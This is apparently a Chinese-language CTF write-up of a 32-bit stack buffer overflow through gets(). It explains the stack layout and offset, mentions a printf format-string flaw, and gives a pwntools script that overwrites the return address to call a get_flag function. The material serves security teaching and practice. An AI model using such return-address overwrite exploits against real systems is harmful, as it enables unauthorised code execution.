---
title: gets
date: '2025-6-14 22:00'
categories:
  - PWN
  - 栈溢出（Stack Overflow）
tags:
---

![](/images/{4CFEA279-2137-4C60-9C95-DDC38ED31AC1}1.png)
32位仅部分开启RELRO保护
![](/images/{F054FEF7-B882-4776-BCDB-686A78907E92}1.png)
![](/images/{5134CF56-EB95-448F-9D0C-96C479650816}.png)
![](/images/Pastedimage20250605152104.png)
栈布局：
````plaintext
[ s[36] ] [ ebp ] [ 返回地址 ]
````
声明了一个长度为 36 字节的字符数组 s，调用 gets 函数，并将 s 数组作为参数传递给它，然后将 gets 函数的返回值作为 ctfshow 函数的返回值。

这里是 28h，也就是 0x28，对于 32 位程序，我们 payload 还需要加 4 。
（根据程序是 32 位还是 64 位，对应加上 4 或 8 个字节的 ebp（栈底））
![](/images/Pastedimage20250605144435.png)
漏洞在于 `printf(s)` 直接使用文件内容作为格式字符串，这会导致：
1. 如果文件内容包含格式化字符（如 `%x`, `%p`, `%s`），会泄露栈内存
2. 可能造成内存崩溃（如使用 `%n` 写入内存）
右键Text view
![](/images/Pastedimage20250605150355.png)
知道get_flag函数的地址在0x08048586
```python
from pwn import * 
context(arch='i386',os='linux',log_level='debug')

p = process('./pwn2')  #本地连接
#p=remote('10.190.131.17',51286) #远程连接

elf = ELF('./pwn2') 
# get_flag=elf.sym['get_flag'] #查找get_flag函数的地址
get_flag_addr = 0x08048586 #get_flag 函数地址 

 #构造栈溢出 payload 
payload = cyclic(0x28+4) + p32(0x8048586) # 覆盖返回地址为 get_flag，32位程序用 p32

p.sendline(payload) #发送 payload
p.interactive() #交互获取 flag 输出 
```
![](/images/{6BDB377B-73EA-4D11-9676-CA8F8310F6CE}.png)


